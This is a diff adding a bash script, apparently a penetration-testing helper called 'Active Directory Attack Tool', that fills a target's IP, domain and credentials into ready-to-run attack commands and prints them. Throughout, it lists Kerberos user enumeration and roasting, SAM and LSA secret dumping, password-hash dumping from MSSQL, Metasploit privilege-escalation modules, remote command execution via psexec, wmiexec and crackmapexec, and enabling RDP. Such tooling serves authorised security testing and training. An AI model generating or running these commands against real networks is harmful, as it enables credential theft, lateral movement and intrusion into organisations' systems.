@@ -1,0 +1,370 @@
+#!/bin/bash
+
+set -e
+set -u
+set -o pipefail
+
+################################################################################
+# Variables                                                                    #
+################################################################################
+
+Username="";	#
+NQUsername="";	#
+Password="";	#
+Domain="";	#
+NQDomain="";	#
+IP="";		#
+NQIP="";	#
+LDAP="";	#
+baseLDAP="";	#
+DC="";		#
+NS="IP";	#
+
+
+# Wordlists
+UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
+
+################################################################################
+# Colors                                                                    #
+################################################################################
+
+RESTORE='\033[0m'
+
+RED='\033[00;31m'
+GREEN='\033[00;32m'
+YELLOW='\033[00;33m'
+BLUE='\033[00;34m'
+PURPLE='\033[00;35m'
+CYAN='\033[00;36m'
+LIGHTGRAY='\033[00;37m'
+
+LRED='\033[01;31m'
+LGREEN='\033[01;32m'
+LYELLOW='\033[01;33m'
+LBLUE='\033[01;34m'
+LPURPLE='\033[01;35m'
+LCYAN='\033[01;36m'
+WHITE='\033[01;37m'
+
+IBLUE='\033[02;34m'
+ICYAN='\033[02;36m'
+
+################################################################################
+# Options                                                                      #
+################################################################################
+
+while [ $# -gt 0 ]; do
+        key="$1"
+
+        case "${key}" in
+              
+        -i | --ip)
+                IP="'$2'";
+                NQIP="$2";
+                shift
+                shift
+                ;;
+                
+        -u | --username)
+                Username="'$2'";
+                NQUsername="$2";
+                shift
+                shift
+                ;;
+                
+        -p | --password)
+                Password="'$2'";
+                shift
+                shift
+                ;;    
+
+        -h | --help)
+                Help;
+                shift
+                shift
+                ;;
+                
+        -d | --domain)
+                Domain="'$2'";
+                NQDomain="$2";
+                shift
+                shift
+                ;;
+                
+        -l | --LDAP)
+                LDAP="'$2'";
+                shift
+                shift
+                ;;          
+                                                                                                                                        
+                
+        *)
+                POSITIONAL="${POSITIONAL} $1"
+                shift
+                ;;
+        esac
+done
+
+################################################################################
+# Banner                                                                     #
+################################################################################
+echo -e ""
+echo -e ""
+echo -e ""
+echo 'CSAgICBfICAgIF9fX18gICAgXyAgX19fX18gCgkgICAvIFwgIHwgIF8gXCAgLyBcfF8gICBffAoJICAvIF8gXCB8IHwgfCB8LyBfIFwgfCB8ICAKCSAvIF9fXyBcfCB8X3wgLyBfX18gXHwgfCAgCgkvXy8gICBcX1xfX19fL18vICAgXF9cX3w=' | base64 -d
+echo -e ""
+echo -e ""
+echo -e "	${LGREEN}Active Directory Attack Tool v1.0${RESTORE}"
+echo -e  "	${LGREEN}Author:	ViperOne${RESTORE}"
+echo -e ""
+echo -e ""
+
+################################################################################
+# Links                                                                     #
+################################################################################
+
+echo -e "\e[1;31mhttps://github.com/The-Viper-One/ActiveDirectoryAttackTool \e[0m"
+echo -e "\e[1;31mhttps://viperone.gitbook.io/pentest-everything/everything/everything-active-directory \e[0m"
+echo -e ""
+echo -e ""
+echo -e ""
+
+################################################################################
+# Main                                                                     #
+################################################################################
+
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+
+# DNS
+echo -e "${LGREEN}DNS${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn --script dns-brute --script-args dns-brute.threads=12 $Domain $IP"
+echo -e "nmap -Pn -n --script ""\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"\"" $IP"
+echo -e ""
+echo -e "${IBLUE}DNSenum${RESTORE}"
+echo -e "dnsenum --dnsserver $IP --enum $Domain"
+echo -e ""
+echo -e "${IBLUE}DNSrecon${RESTORE}"
+echo -e "dnsrecon -d $Domain"
+echo -e ""
+echo -e "${IBLUE}Dig${RESTORE}"
+echo -e "dig AXFR $Domain @$NQIP"
+echo -e ""
+echo -e "${IBLUE}Fierce${RESTORE}"
+echo -e "fierce -dns $Domain"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# Kerberos
+echo -e "${LGREEN}Kerberos${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impacket${RESTORE}"
+echo -e "GetNPUsers.py $Domain/ -usersfile $UserList -dc-ip $IP -format 'hashcat'"
+echo -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'hashcat'"
+echo -e ""
+echo -e "${IBLUE}Kerbrute${RESTORE}"
+echo -e "kerbrute userenum $UserList --dc $IP --domain $Domain"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=$Domain,userdb=$UserList $IP"
+echo -e ""
+echo -e "${IBLUE}Metasploit${RESTORE}"
+echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers;set rhost $IP;set DOMAIN $Domain;set USER_FILE $UserList;exploit'"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# NTP
+echo -e "${LGREEN}NTP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}NTPdate${RESTORE}"
+echo -e "sudo ntpdate $IP"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "sudo nmap -Pn -sU -p 123 --script ntp-info $IP"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# SMB
+echo -e "${LGREEN}SMB${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -Pn -p 139,445 $IP"
+echo -e ""
+echo -e "${IBLUE}nmblookup${RESTORE}"
+echo -e "nmblookup -A $IP"
+echo -e ""
+echo -e "${IBLUE}enum4linux${RESTORE}"
+echo -e "enum4linux -u $Username -p $Password -r $IP| grep 'Local User'"
+echo -e ""
+echo -e "${IBLUE}SMBmap${RESTORE}"
+echo -e "smbmap -H $IP -u $Username -p $Password"
+echo -e ""
+echo -e "${IBLUE}SMBclient${RESTORE}"
+echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --rid-brute"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --lsa"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --sam"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --pass-pol"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --local-groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --users"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --sessions"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --disks"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users"
+echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# LDAP
+echo -e "${LGREEN}LDAP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn -n -sV --script "\"ldap* and not brute"\" $IP"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --admin-count"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --asreproast ASREPROAST"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --groups"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --kerberoasting KERBEROASTING"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --password-not-required"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --trusted-for-delegation"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --users"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M get-desc-users"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M laps"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M ldap-signing"
+echo -e ""
+echo -e "${IBLUE}LDAPdomaindump${RESTORE}"
+echo -e "ldapdomaindump -u $NQDomain\\\\\\\\$NQUsername -p $Password ldap://$NQIP"
+echo -e ""
+echo -e "${IBLUE}LDAPsearch${RESTORE}"
+echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP""
+echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# WinRM
+echo -e "${LGREEN}WinRM${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec winrm $IP -u $Username -p $Password"
+echo -e ""
+echo -e "${IBLUE}Evil-WinRM${RESTORE}"
+echo -e "evil-winrm -i $IP -u $Username -p $Password"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# MSSQL
+echo -e "${LGREEN}MSSQL${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn -p 1433 -sU --script=ms-sql-info.nse $IP"
+echo -e 
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -x whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
+echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -X whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impacket${RESTORE}"
+echo -e "mssqlclient.py -port 1433 $Username:$Password@$NQIP"
+echo -e ""
+echo -e "${IBLUE}Metasploit${RESTORE}"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping;set rhosts $IP ;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum_sql_login;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec;set rhosts $IP ;set username $Username;set password $Password;set command net user;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata ;set rhosts $IP ;set username $Username;set password $Password;set sample_size 4;set keywords FirstName|passw|credit; exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_sql;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# BloodHound
+echo -e "${LRED}BloodHound${RESTORE}"
+echo -e "${RED}https://github.com/fox-it/BloodHound.py${RESTORE}"
+echo -e ""
+echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# Impacket
+echo -e "${LGREEN}Impacket${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}GetADUsers${RESTORE}"
+echo -e "GetADUsers.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e ""
+echo -e "${IBLUE}GetNPUsers${RESTORE}"
+echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'"
+echo -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'"
+echo -e ""
+echo -e "${IBLUE}GetUserSPNs${RESTORE}"
+echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e ""
+echo -e "${IBLUE}Execution Methods${RESTORE}"
+echo -e "atexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "psexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "smbexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "wmiexec.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# RDP
+echo -e "${LGREEN}RDP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}xFreeRDP${RESTORE}"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -M rdp -o ACTION=enable" ;echo -e " ${YELLOW}# Enable RDP${RESTORE}"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+# Pywerview
+echo -e "${LGREEN}Pywerview${RESTORE}"
+echo -e "${RED}https://github.com/the-useless-one/pywerview${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}# Information Gathering${RESTORE}"
+echo -e "python3 pywerview.py get-dfsshare -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-domainpolicy -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgroup -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/samaccountname: //' | sort"
+echo -e "python3 pywerview.py get-netcomputer -u $Username -p $Password -w $Domain --dc-ip $IP  | sed 's/dnshostname: //' | sort"
+echo -e "python3 pywerview.py get-netdomaincontroller -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netfileserver -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgpo -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgpogroup -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netou -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/distinguishedname: //' | sort"
+echo -e "python3 pywerview.py get-netsite -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/name: //' | sort"
+echo -e "python3 pywerview.py get-netuser -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e ""
+echo -e "${IBLUE}# Hunting${RESTORE}"
+echo -e "python3 pywerview.py invoke-eventhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py invoke-processhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py invoke-userhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+################################################################################
+# End	                                                                       #
+################################################################################
